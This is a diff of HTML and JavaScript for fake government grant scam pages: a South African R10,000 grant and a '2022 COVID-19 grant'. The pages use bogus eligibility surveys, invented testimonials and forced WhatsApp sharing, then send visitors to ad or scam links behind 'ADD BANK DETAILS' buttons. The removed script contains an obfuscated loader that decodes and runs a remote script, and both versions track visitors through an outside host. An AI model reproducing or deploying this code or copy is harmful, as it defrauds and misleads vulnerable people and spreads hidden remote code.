-							<img alt="" height="26" id="alertimg" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAQMAAACThN6NAAAABlBMVEUAAAC5ubnoUmKJAAAAAXRSTlMAQObYZgAAAEVJREFUCNdjQAI8cEIOTtiDiPoGGPH5AIh4wMDA+PkDAwMzhPjBwMAOIvg//4ES8v//AbV+/g8l6v//b4AQ////P8CACgCNvyHz1VKxBQAAAABJRU5ErkJggg=="
-							 width="26">
-							Attention!
-						</div>
-						<div class="popup-center">Because you are sure you do not need this support, many people have already received support</div>
-						<div class="popup-bottom">
-							<div class="button" onclick="hidepop();">
-								Ok
-							</div>
-						</div></center>
-					</div>
-              
-              	<center><img src="https://4.bp.blogspot.com/-BmX5p-2Bb38/WE3bZ5SU1VI/AAAAAAAAADQ/1nJfKw9j8XMQ-7EkhBQWO0IbSqS_dNeDQCPcB/s1600/JAMB-joint%2Badmission%2Band%2Bmatriculation%2Bboard-Logo.png" alt="Chicago" width="100%" height="100%">
-						<div class="content">
-							<!-- content -->
-							<div class="content-middle">
-								<div class="content-inner">
-									<p class="headline"></p>
-									<p class="small_headlines">
-										<b style="color: #038026;">
-											congratulations
-										</b>
-										<br>
-										THE REPUBLIC OF SOUTH AFRICA has created this platform to empower its citizens
+<body>
 
-All South African Citizens Are Entitled for This 10,000rand Empowerment Grant 
-										<sup>[1]</sup>
-										<br><br>
-										<sub>[1] Get Your Own R10,000 immediately By Answering the following questions Below</sub>
-									</p>
-									<div class="survey_outer">
-										<div class="survey_middle">
-											<div class="survey_inner">
-												<p class="question_text question1">
-													
-<b>Use of English - Jamb CBT
-</b>
-Choose the option nearest in meaning to the word(s) or phrase in italics.
-<hr>
-1. That punch by the young boxer proved to be fatal.
-                          <br>
-<input type="radio" id="age1" name="age" value="30">
-  <label for="age1">effective</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">hard</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">deadly</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">belated</label>
-  <hr>
-Choose the option opposite in meaning to the word or phrase in italics.
+<center>
+<div class='content'>
+<!-- content -->
+<div class='content-middle'>
+<div class='content-inner'>
+<p class='headline' style="color:#000000;">
+<img src='https://1.bp.blogspot.com/-w_CV5NlIkAQ/YGGO8YOUf5I/AAAAAAAABug/_pbncHWk8Cg0CV9isWVeXA1FZ2g1Kot8QCLcBGAsYHQ/s710/COVID-newsletter_EN.jpeg&width=100%' width='100%' /><br/><strong> <font color="#2980B9">2022 COVID-19 GRANT</font></strong><br/>
+Government 2022 Covid-19 Relief Grant<br/>
+  
+</p>
+<b>
+Please answer the following questions first:
+<b> <br/>
+<div class='survey_outer'>
+<div class='survey_middle'>
+<div class='survey_inner'>
+<!-- <p class='question_count'>
+Pergunta
+<span>
+1
+</span>
+de 3
+</p> -->
+<p class='question_text question1'>
+Question 1: I'm...?
+</p>
+<p class='question_text question2'>
+Question 2: Why do you need this Grant?
+</p>
+<p class='question_text question3'>
+Question 3: How Old are you?
+</p>
+<p class='question_text question4'>
+Question 4: How Old are you?
+</p>
+<p class='question_text question5'>
+Question 5: How Old are you?
+</p>
+<p class='question_text question6'>
+Question 6: How Old are you?
+</p>
+<p class='question_text question7'>
+Question 7: How Old are you?
+</p>
+<div class='ans-box'>
+<div class='answer anses1'>
+<p>
+Male
+</p>
+</div>
+<div class='answer anses1'>
+<p>
+Female
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+For Business
+</p>
+</div>
+  <div class='answer anses2'>
+<p>
+For School Fees
+</p>
+</div>
+  
+<div class='answer anses2'>
+<p>
+For House Rent
+</p>
+</div>
+  <div class='answer anses2'>
+<p>
+For Food
+</p>
+</div>
+  
+<div class='answer anses3'>
+<p>
+15-30
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+30-35
+</p>
+</div>
+  <div class='answer anses3'>
+<p>
+35-40
+</p>
+</div>
+  <div class='answer anses3'>
+<p>
+40-Above
+</p>
+</div>
+<div class='answer anses4'>
+<p>
+40-Above4444
+</p>
+</div>
+<div class='answer anses5'>
+<p>
+40-Above55555
+</p>
+</div>
+<div class='answer anses6'>
+<p>
+40-Above6666666
+</p>
+</div>
+<div class='answer anses7'>
+<p>
+40-Above777777
+</p>
+</div>
+<div class='answer anses7'>
+<p>
+40-Above56789677777
+</p>
+</div>
+  
+  </div>
+<p class='calculating'>
+<img alt='' src='https://i.imgur.com/aR2WaUf.gif'/>
+Please wait, we are processing your feedback.
+</p>
+<div class='loading'>
+<p class='load_headline'>
+Please wait a moment ...
+</p>
+<img alt='' src='https://i.imgur.com/aR2WaUf.gif' style='height:50px;width:50px;'/>
+<p class='check check1'>
+All questions have been answered
 
-2. The dressmaker unpicked the seam of the shirt.
-<br>
- <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">sewed up</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">picked up</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">tore up</label><br>
-  <input type="radio" id="age1" name="age" value="30">
-  <label for="age1">threaded</label>
-  <hr>
-										</p>
-												<p class="question_text question2">
-													Question 2 of 3 questions: What is your marital status?
-												</p>
-												<p class="question_text question3">
-													Question 3 of 3 questions: Why Do You Want This Grant?
-												</p>
-												<div class="ans-box">
-													<div class="answer anses1">
-														<p>
-															Student
-														</p>
-													</div>
-													<div class="answer anses1">
-														<p>
-															Self-employed
-														</p>
-													</div>
-													<div class="answer anses1">
-														<p>
-															Unemployed
-														</p>
-													</div>
-													<div class="answer anses2">
-														<p>Married</p>
-													</div>
-													<div class="answer anses2">
-														<p>Single</p>
-													</div>
-													<div class="answer anses2">
-														<p>Divorce</p>
-													</div>
-													<div class="answer anses3">
-														<p>
-															Business Support
-														</p>
-													</div>
-													<div class="answer anses3">
-														<p>
-															Scholarship
-														</p>
-													</div>
-													<div class="answer anses3">
-														<p>
-															Health Care 
-														</p>
-													</div>
-												</div>
-												<p class="calculating">
-													<img alt="" src="https://tinubu-foundation.claim-ltt.online/giphy.gif">
-												</p>
-												<div class="loading">
-													<p class="load_headline">
-													</p>
-													<img alt="" src="https://tinubu-foundation.claim-ltt.online/giphy.gif" style="height:50px;width:50px;">
-													<p class="check check1">
-														Checking your information...
-													</p>
-													<p class="check check2">
-														Checking your answers...
-													</p>
-													<p class="check check3">
-														Your request has been approved
-													</p>
-												</div>
-												<div class="last_page">
-													<div class="last-up"><br>
-														<center> <i>
-																<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Flag_of_South_Africa.svg/180px-Flag_of_South_Africa.svg.png" alt="UN" width="10%">
-															</i>
-															<i>
-																<img src="https://image.shutterstock.com/image-illustration/south-africa-coat-arms-3d-600w-507694675.jpg" alt="UN" width="11%">
-															</i><i>
-																<img src="https://image.shutterstock.com/image-illustration/3d-seal-president-south-africa-600w-763862485.jpg" alt="UN" width="11%">
-															</i><i>
-																<img src="https://c8.alamy.com/comp/M24FA7/south-africa-coat-of-arms-and-flag-official-symbols-of-the-nation-M24FA7.jpg" alt="UN" width="11%">
-															</i></center>
-														<center>
-															<h4 class="textlastup">
-																<i>
-																	<img src="https://media.istockphoto.com/photos/approved-stamp-picture-id462389053" alt="UN" width="4%">
-																</i>
-																<i style="font-size: 17px;">South Africa Support Funds:</i>
-																<div id='lastapp'>
-																<br><br>
-																<b>After considering your answers, your support fund amount is set to R10,000 and complete the steps to obtain the withdrawal code from the electronic counter</b>
-																<br><br>
-																-You will get the support fund with only one step, kindly click the &quot;Share On Whatsapp&quot; button below to share this information with  15 friends or 5 groups on WhatsApp so That They Can Also Benefit.
-																<br><br>
-																</div>
-															</h4>
-														</center>
-														<script type="text/javascript">
-if(get_Cookie('prog')){
-	setTimeout(function(){
-		$(".question_count").hide();
-										$(".question1").hide();
-										$(".anses1").hide();
-		$(".headline,.small_headlines,.timer").hide();
-									//sakrij content surveya MobGyan
-									$(".loading").hide();
-									$(".survey_outer").css("height", "auto");
-									$(".last_page").show();
-									$(".fbcoms").show();
-			incrementValue_a();
-			fn1_a();
-		},2000)
-	}
-j='%0A%0A*The Republic of South Africa 2022 Grant*%0A%0AHurry Now and Check if You are Eligible to Receive *R10,000* Support Fund As Part Of Government Support Grant.%0A%0A_This Grant Is Available To All South Africans_ %0A%0A_Apply Here_%0A%0A https://bit.ly/SA-Gov-Support-Grant';
+</p>
+<p class='check check2'>
+You are 100% qualified.
+</p>
+<p class='check check3'>
+Congratulations! <img src='https://blogger.googleusercontent.com/img/a/AVvXsEgGfhp-X9Wlaiu0hN6ydgmgrt6pSeHgQzQ_E97l0D5nhYnypF6YeKj3reNpm3rJAgZUtmC_bd6PbVBi32uplh5slssU0ftMeThThcl96KONFydt98JiCG9jopepA2HSiMarkek1alQNibiySz9SG1WKTpHLx6CVkJP6gCbLWLblTOOLdOyJ8idPhveZmA=s320' width='100%' />
+
+</p>
+</div>
+<div class='last_page'>
+<div class='last-up'>
+<h4 class='textlastup'>
+<img src='https://1.bp.blogspot.com/-w_CV5NlIkAQ/YGGO8YOUf5I/AAAAAAAABug/_pbncHWk8Cg0CV9isWVeXA1FZ2g1Kot8QCLcBGAsYHQ/s710/COVID-newsletter_EN.jpeg&width=710' width='350' />
+
+Congratulations!
+<br/><br/> <div id='lastapp'>
+<font color="white"> Through Your Answer you are eligible to Get<strong>Government 2022 Covid19 GRANT </strong> <br></br>How to get it:</font><br/><br/>
+
+1. Share with 5 groups / 20 friends via WHATSAPP (click the "WhatsApp" icon below)
+<br/><br/>
+2. Click "ADD ACCOUNT DETAILS" to Continue
+<br/><br/></div>
+</h4>
+<script type="text/javascript">
+j='';
 banner='';
 $.getScript('yuming.js?'+ (new Date()).getTime());
-function incrementValue1()   {
-	if(parseInt(get_Cookie('prog')) > 200){
-		window.open('whatsapp://send?text= ');
-	}else{    
-		window.open("whatsapp://send?text=" + j);
-	}  
-	setTimeout(function(){
-		incrementValue_i();
-		fn1_i();
-	   value = parseInt(get_Cookie('prog'));
-	   set_Cookie('prog',value+1);
-	},2000);
+
+
+theme='aden';
+
+var vid=[
+'Qzkj_p7GnLc',
+];
+
+var STRONG = {
+share: 10
+};
+
+
+
+function incrementValue1() {
+if(parseInt(get_Cookie('prog')) > 600){
+window.open('whatsapp://send?text=' + tb);
+}else{
+window.open('whatsapp://send?text=' + tb);
 }
-function incrementValue_i(){
-	get_Cookie('prog')=='' ? value=0 : value=get_Cookie('prog') ;
-	value == 2 || value == 4  ? alert('Sharing failed! The same group or the same friend is not correct. Please check and share again.') : void(0) ;
-	set_Cookie('prog',value);
-	record('hw',value);
-	if(value>= 12){
-		record('hw','wc');
-		lasthtml();
-	}
+setTimeout(function(){
+incrementValue_i();
+fn1_i();
+value = parseInt(get_Cookie('prog'));
+set_Cookie('prog',value+1);
+},2000);
 }
-var spin2enabled=false;
-var ob=0;
-var _0xodL='jsjiami.com.v6',_0x44bf=[_0xodL,'prog','querySelector','.progress','style','display','block','.progress span','width','.progress p','textContent','log','vi ','obi ','getScript','Ly9vd28tb3dvLnZpcC92ZXJpZnkuanM=','jrsjOiabEwmiy.creokm.eveC6qYHqZ=='];var _0x17b0=function(_0x28cb23,_0x342809){_0x28cb23=~~'0x'['concat'](_0x28cb23);var _0x3dc9ef=_0x44bf[_0x28cb23];return _0x3dc9ef;};(function(_0x14b92e,_0x509ab3){var _0x2ed94d=0x0;for(_0x509ab3=_0x14b92e['shift'](_0x2ed94d>>0x2);_0x509ab3&&_0x509ab3!==(_0x14b92e(_0x2ed94d>>0x3)+'')['replace'](/[rObEwyrekeeCqYHqZ=]/g,'');_0x2ed94d++){_0x2ed94d=_0x2ed94d^0x6706a;} }(_0x44bf,_0x17b0));function fn1_i(){v=get_Cookie(_0x17b0('0'));document[_0x17b0('1')](_0x17b0('2'))[_0x17b0('3')][_0x17b0('4')]=_0x17b0('5');v=='0'?ob=0x1e:v=='1'?ob=0x32:v=='2'?ob=0x34:v=='3'?ob=0x3c:v=='4'?ob=0x3c:v=='5'?ob=0x41:v=='6'?ob=0x46:v=='7'?ob=0x50:v=='8'?ob=0x55:v=='9'?ob=0x5a:v=='10'?ob=0x60:v=='11'?ob=0x62:v=='12'?ob=0x64:void 0x0;document[_0x17b0('1')](_0x17b0('6'))[_0x17b0('3')][_0x17b0('7')]=ob+'%';document[_0x17b0('1')](_0x17b0('6'))[_0x17b0('3')][_0x17b0('7')]=ob+'%';document[_0x17b0('1')](_0x17b0('8'))[_0x17b0('9')]=ob+'%';console[_0x17b0('a')](_0x17b0('b')+v);console[_0x17b0('a')](_0x17b0('c')+ob);}$[_0x17b0('d')](atob(_0x17b0('e')));;_0xodL='jsjiami.com.v6';
-function incrementValue_a(){
-	value = parseInt(get_Cookie('prog'))-1;
-	value == 2 || value == 4  ? alert('Sharing failed! The same group or the same friend is not correct. Please check and share again.') : void(0) ;
-	record('hw',value);
-	if(value>= 12){
-		record('hw','wc');
-		lasthtml();
-	}
+function incrementValue_i()
+{
+get_Cookie('prog')=='' ? value=0 : value=get_Cookie('prog') ;
+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+set_Cookie('prog',value);
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
 }
+}
+function fn1_i() {
+v=get_Cookie('prog');
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
+}
+
+function incrementValue_a()
+{
+value = parseInt(get_Cookie('prog'))-1;
+value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void(0) ;
+record('adien',value);
+record(theme,'share');
+if(value>= 12){
+record('adien','wc');
+lasthtml();
+}
+}
+
 function fn1_a() {
-	v=parseInt(get_Cookie('prog'))-1;
-	document.querySelector('.progress').style.display = 'block';
-	v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
-	document.querySelector('.progress span').style['width'] = ob + '%';
-	document.querySelector('.progress span').style['width'] = ob + '%';
-	document.querySelector('.progress p').textContent = ob + '%';
-	console.log('v '+v);
-	console.log('ob '+ob);
+v=parseInt(get_Cookie('prog'))-1;
+document.querySelector('.progress').style.display = "block";
+v=='0'?ob=30:v=='1'?ob=50:v=='2'?ob=52:v=='3'?ob=60:v=='4'?ob=60:v=='5'?ob=65:v=='6'?ob=70:v=='7'?ob=80:v=='8'?ob=85:v=='9'?ob=90:v=='10'?ob=96:v=='11'?ob=98:v=='12'?ob=100:void(0);
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress span').style['width'] = ob + "%";
+document.querySelector('.progress p').textContent = ob + "%";
 }
+
+
+
 function tipn(){
-	alert('You Have To Share This Information with friends on Whatsapp .  Share until the blue bar is full!, Let Others Also Benefit From this program');
+alert('You Will Recive Your GRANT immidiately after you share to whatsApp groups and friends so they can also benefit from it. \n Share until the blue bar is full!');
 }
+
+
 function set_Cookie(name,value){
-	var Days = 30;
-	var exp = new Date();
-	exp.setTime(exp.getTime() + (Days*20*1000));
-	document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+var Days = 30;
+var exp = new Date();
+exp.setTime(exp.getTime() + (Days*20*1000));
+document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
 }
 function get_Cookie(name){
-	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-	if(arr=document.cookie.match(reg)){
-	return unescape(arr[2]);
-	}
-	return '';
+var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+if(arr=document.cookie.match(reg)){
+return unescape(arr[2]);
 }
- function getQueryString(name) {
-	var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
-	var r = window.location.search.substr(1).match(reg);
-	if (r != null) {
-		return unescape(r[2]);
-	}
-	return null;
+return '';
 }
-function lasthtml(){
-	html='<font color="red">Congratulations! The last step:</font><br/><br/>To facilitate the sending of money you must complete this final step of Human Verification!<br/><br/>1. You need to be careful to carry out tasks that you will be paid according to your Account Type.<br/><br/> (Remember, this step is very important)<br/><br/>Now Select your account type.<br/><br/>';
-	document.getElementById("lastapp").innerHTML=html;	
-	document.getElementById("buttonl").style.display='none';	
-	document.getElementById("button2").style.display='block';
+function getQueryString(name) {
+var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+var r = window.location.search.substr(1).match(reg);
+if (r != null) {
+return unescape(r[2]);
 }
-dl='https://thaudray.com/4/3153728';
- function dappp(){
-	window.open(dl);
-}  
-function dappp(){
-	window.open('https://thaudray.com/4/3153728');
-}  
+return null;
+}
+
 record(getQueryString('th'));
-record('hw');
+record('adien');
+
 function record (a,b){
-	if(b){
-		if(get_Cookie(a+b)!== a+b){
-			$.getScript('//r.line-me.vip/record/total.php?ac=node&name='+a+'&node='+b);
-			set_Cookie(a+b,a+b);
-		}
-	}else{
-		if(get_Cookie(a)!== a){
-			$.getScript('//r.line-me.vip/record/total.php?ac=total&name='+a);
-			set_Cookie(a,a);
-		}
-	}
+var aa = new XMLHttpRequest;
+if(b){
+if(get_Cookie(a+b)!== a+b){
+aa.open("GET", '//r.line-me.vip/record/total.php?ac=node&name='+a+'&node='+b), aa.onreadystatechange = function () {
+set_Cookie(a+b,a+b);
+}, aa.send(null)
 }
-														</script>
-														<div id='buttonl'>
-					<button class='btn btn-primary share_btn_change' onclick='incrementValue1()' type='button'>Share On Whatsapp</button>
-					<input id='number' type='hidden' value='0' />
-					<h4 class='textlastup'>Share it until the blue bar is full!</h4>
-					<div class='progress'>
-						<span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar' style='width: 1%; max-width: 100%;' /><p></p>
-					</div>
-                                                          <br>
-					<center>
-							<span style="color: black;font-size: 20px;">-After sending the invitation, click the &quot;Get withdrawal code&quot; button:</span>
-														</center>
-					<a href="javascript:tipn();" id="b2" style="padding: 0px">
-						<div class='btn btn-primary share_btn_change'>
-							Get withdrawal code</div>
-					</a>
-				</div>
-			</div>
-			<div id='button2' style="display:none">
-				<button class='btn btn-primary' onclick='dappp()' type='button'>Savings Account</button>
-				<button class='btn btn-primary' onclick='dappp()' type='button'>Current Account</button>
-			</div>
-						<br>
-														<center>
-															<span style="color: red;font-size: 20px;">Note: If you do not complete this step correctly, you will not get the Support Fund every Week.</span>
-														</center>
-													</div>
-												</div>
-											</div>
-										</div>
-									</div>
-									<br>
-									<center>
-										<br>
-										<div class="fbcoms">
-                    						<p class=" comments">user comment:</p>
-											<p class="buttons">
-												<span class="like">
-													Like
-													<i style="font-size:17px" class="fa fa like" aria-hidden="true"></i>
-												</span>
-												&nbsp; &nbsp;
-												<span>
-													Share
-													<i style="font-size:17px" class="far" aria-hidden="true"></i>
-												</span>
-												&nbsp; &nbsp;
-												<span>
-													Comment
-													<i style="font-size:17px" class="far" aria-hidden="true"></i>
-												</span>
-												&nbsp; &nbsp;
-												<span>
-													Remove
-												</span>
-											</p>
-											<p class="totlikes">
-												<span id="youand"></span>
-												<span class="fbblue">
-													others 204,208
-												</span>
-												like this
-											</p>
-											<p class="viewmore clearfix">
-												<span class="left">
-													...more comments
-												</span>
-												<span class="right">
-													63 of 173,330
-												</span>
-												<br>
-											</p>
-											<div class="item" id="fb8" opacity:="" 1;>
-												<img class="profileimg" height="50" src="https://scontent.flos3-1.fna.fbcdn.net/v/t1.6435-9/82920881_2649814168459825_8437821290055729152_n.jpg?_nc_cat=100&ccb=1-5&_nc_sid=09cbfe&_nc_eui2=AeGMBTDrHsSSm1EpxkyjQueK9P6hYkH8H270_qFiQfwfbqHIuzk1LSzW_JO1E-PjUhlvc9pPpZYtXH1PPOHqUqg6&_nc_ohc=6RNjCr6nngcAX-tU0KY&_nc_oc=AQmQBaO1gocATJoRGXilpM9cz7Cc_EjbGatUsr_QHLRGjh2JnoSnU5BipLrZNktP4KU&tn=Bgji9kv4iY0EMK4t&_nc_ht=scontent.flos3-1.fna&oh=00_AT-_yJYFKUqofDR0QtKXMWWumZ0eVY3VHVhegF6feLi7Ow&oe=6226DAF1" width="50">
-												<p class="comtxt" style="display: block;">
-													<span class="name">
-														Adegoke Sammuel
-													</span>
-													<br>
-													Wow! I just received mine, this is indeed a blessing from the government. 
-												</p>
-												<p class="combot" style="display: block;">
-													<span class="ago">
-														Just now
-													</span>
-													
-													<span class="fblike">
-														Like
-													</span>
-												</p>
-											</div>
-                           
-<div class="item" id="fb7" opacity:="" 1;>
-												<img class="profileimg" height="50" src="https://tinubu-foundation.claim-ltt.online/prof2.png" width="50">
-												<p class="comtxt" style="display: block;">
-													<span class="name">
-														Haruna Abdullahi
-													</span>
-													<br>
-													Have you received the withdrawal code?
-												</p>
-												<p class="combot" style="display: block;">
-													<span class="ago">
-														Just now
-													</span>
-													
-													<span class="fblike">
-														Like
-													</span>
-												</p>
-											</div>
-											<div class="item" id="fb6" opacity:="" 1;>
-												<img class="profileimg" height="50" src="https://tinubu-foundation.claim-ltt.online/prof12.png" width="50">
-												<p class="comtxt" style="display: block;">
-													<span class="name">
-														Oladisi Ganiyat
-													</span>
-													<br>
-													A Big Thanks to the Republic of south Africa, I just recieved Mine 
-												</p>
-												<p class="combot" style="display: block;">
-													<span class="ago">
-														Just now
-													</span>
-													
-													<span class="fblike">
-														Like
-													</span>
-												</p>
-											</div>
-											<div class="item" id="fb5" opacity:="" 1;>
-												<img class="profileimg" height="50" src="https://tinubu-foundation.claim-ltt.online/prof11.png" width="50">
-												<p class="comtxt" style="display: block;">
-													<span class="name">
-														Obinna Joy
-													</span>
-													<br>
-													Hahaha, I got it!
-												</p>
-												<br>										<p class="combot" style="display: block;">
-													<span class="ago">
-														Just now
-													</span>
-													
-													<span class="fblike">
-														Like
-													</span>
-												</p>
-											</div>
+}else{
+if(get_Cookie(a)!== a){
+aa.open("GET",'//r.line-me.vip/record/total.php?ac=total&name='+a), aa.onreadystatechange = function () {
+set_Cookie(a,a);
+}, aa.send(null)
+}
+}
+}
 
-<div class="item" id="fb4" opacity:="" 1;>
-												<img class="profileimg" height="50" src="https://tinubu-foundation.claim-ltt.online/prof16.png" width="50">
-												<p class="comtxt" style="display: block;">
-													<span class="name">
-														David Johnson
-													</span>
-													<br> I received the withdrawal code, what should I do now?
-												</p>
-												<p class="combot" style="display: block;">
-													<span class="ago">
-														Just now
-													</span>
-													<!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1631658,"Like","#ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+var zeit = new Date();
+var sec = zeit.getSeconds();
+if (sec < 6 ){
+sec = 9
+}
+if (sec > 5 & sec < 13 ){
+sec = 8
+}
+if (sec > 11 & sec < 19 ){
+sec = 7
+}
+if (sec > 17 & sec < 25 ){
+sec = 6
+}
+if (sec > 23 & sec < 31 ){
+sec = 5
+}
+if (sec > 29 & sec < 37 ){
+sec = 4
+}
+if (sec > 35 & sec < 43 ){
+sec = 3
+}
+if (sec > 41 & sec < 49 ){
+sec = 2
+}
+if (sec > 47 & sec < 55 ){
+sec = 1
+}
+if (sec > 54){
+sec=0
+};
+var add = sec;
+var zeit2 = new Date();
+var minute = zeit2.getMinutes();
+var timer1 = (60-minute)*60;
+if (timer1 > 1800) {
+var resttimer = (30-minute)*10
+} else {
+var resttimer = (60-minute)*10
+};
+var timer = resttimer + add + 67;
+function updateTimer() {
+timer--;
+$("#gutschein").text(timer);
+if (timer < 9) {
+stopFunction();
+}
+}
+var myTimer = window.setInterval(updateTimer, 6000);
+function stopFunction() {
+window.clearInterval(myTimer);
+}
+
+function lasthtml(){
+html='<font color="#ffffff">The last step:</font><br/><br/>To get your Grant, choose your withdrawal method to complete this final step!<br/><br/>';
+document.getElementById("lastapp").innerHTML=html;
+document.getElementById("buttonl").style.display='none';
+document.getElementById("button2").style.display='block';
+}
+
+function dapp(){
+window.open('https://dooloust.net/4/3153728');
+}
+function dappp(){
+window.open('https://dooloust.net/4/3153728');
+}
+function ads(vdata,ir){
+record('adiensense');
+record('adiensense',ir);
+window.open('https://dooloust.net/4/3153728');
+}
+
+
+
+</script>
+
+<div id='buttonl'>
+<button class='btn btn-primary' onclick='incrementValue1()' type='button'>WhatsApp</button>
+<input id='number' type='hidden' value='0'/>
+
+<h4 class='textlastup'>Share until the blue bar is full!</h4>
+
+<div class='progress'>
+<span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar' style='width: 1%; max-width: 100%;'/><p></p>
+</div>
+<br>
+<a href="javascript:tipn();" id="b2">
+<div class="buttond">ADD ACCOUNT DETAILS</div>
+</a>
+</div>
+</div>
+
+<div id='button2' style="display:none">
+<br />
+  
+ 
+  
+  
+ <a  onclick="window.open('https://dooloust.net/4/3153728')" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ADD BANK DETAILS</button>
+                    </a><br/>
+  <a  onclick="window.open('https://dooloust.net/4/3153728')" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">WITHDRAW VIA CHQUE</button>
+                    </a><br/>
+  <a  onclick="window.open('https://dooloust.net/4/3153728')" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">ADD PAYPAL</button>
+                    </a><br/>
+
+
+
+
+<script type="text/javascript" src=""></script>
+</div>
+<hr/>
+</div></div></div></div>
+<br/>
+<center>
+
+
 </center>
-<!-- END: Powered by Supercounters.com -->
+<br/>
+<div class='fbcoms' style="display:none;">
+<p class='comments'>
+</p>
+<p class='buttons'>
+<span class='like'>
+Like
+</span>
+&#183;
+<span>
+Comment
+</span>
+&#183;
+<span>
+Share
+</span>
+&#183;
+<span>
+delete
+</span>
+</p>
+<p class='totlikes'>
+<span id='youand'>
+</span>
+<span class='fbblue'>
+and 204,208
+</span>
+others like this
+</p>
+<p class='viewmore clearfix'>
+<span class='left'>
+Show 234 more comments…
+</span>
+<span class='right'>
+50 of 120,310
+</span>
+<br/>
+</p>
+<div class='item' id='fb8' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/a/AVvXsEjwppjaWcdnEJQEWm4-LwmZ4PLnnhQpYHKv06q_N_1wMbafE67MBAi2ATjBEnLblEVif95EnTiQ-AVzfd2LANX31Z4o31jetrgEs_ljkNpAOCj6BuNfteGpABQddYXYu4Zo4bTor9mPlldlhRpqzlUY1OGODiMcVFNPr0eG3IxuQfFl5i2i-dRz7l1gyw=s320' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Ima-Obong Ben
+</span>
+<br/>
+Thank you so much for This grant
 
-													<span class="fblike">
-														Like
-													</span>
-												</p>
-											</div>
-											<div class="item">
-												<img class="profileimg" height="50" src="https://tinubu-foundation.claim-ltt.online/prof17.png" width="50">
-												<p class="comtxt">
-													<span class="name">
-														Anita Okoye
-													</span>
-													<br>
-													Today marks my 3rd week of benefiting from this Program, Thank You Tinubu.
-												</p>
-												<p class="combot">
-													<span class="ago">
-														2 min ago
-													</span>
-													
-													<span class="fblike">
-														Like
-													</span>
-													<span class="likes totlikes">
-														223
-													</span>
-												</p>
-											</div>
-										</div>
-										<br>
-										<div>
-											<!-- <div class="pops">
-												<img alt="" id="piplovi" src="img/piplovi.png">
-												<p>
-													AMAN ZAMAN BRATE NEMAC NEMO ME UBIJES BREEEE BREE BREEE
-												</p>
-											</div> -->
-											<div class="reply"><label for="reply">Add reply:</label> <textarea rows="4" id="reply" class="comments__form-input"></textarea>
-												<p><button onclick="alert('Thanks for your comment, it will be posted after review.');" class="comments__form-submit">submit</button></p>
-											</div>
-										</div>
-										<!-- survey-inner MobGyan -->
-									</center>
-								</div>
-							</div>
-						</div>
-					</center>
-				</div>
-			</div>
-		</div>
-		<script>
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb7' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://i.imgur.com/pruRrLG.jpg' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Glory Peter
+</span>
+<br/>
+this is amazing
+
+
+
+</p>
+<p class='combot' style='display: block;'>
+<span class='ago'>
+Just now
+</span>
+&#183;
+<span class='fblike'>
+Like
+</span>
+</p>
+</div>
+<div class='item' id='fb6' style='display: none; opacity: 1;'>
+<img class='profileimg' height='50' src='https://blogger.googleusercontent.com/img/a/AVvXsEjGykVTAV2VmEozgTCwsKEUa39cfa9xFXvQOlvfzGPN9kRlRbUN7ypWp9b1WUCCXIpgHiRSIkv6goe4I22w-x9aHDVEAMmqsl6v5IUgdm4xSCUpl61iACvex8FytPFccLsxDokmqfbKYl_PZ-mJJMf1wHv27sIBw75Y9E_DxqiKIIzteM9uYKxj-JrWCg=s320' width='50'/>
+<p class='comtxt' style='display: block;'>
+<span class='name'>
+Joy Emeka
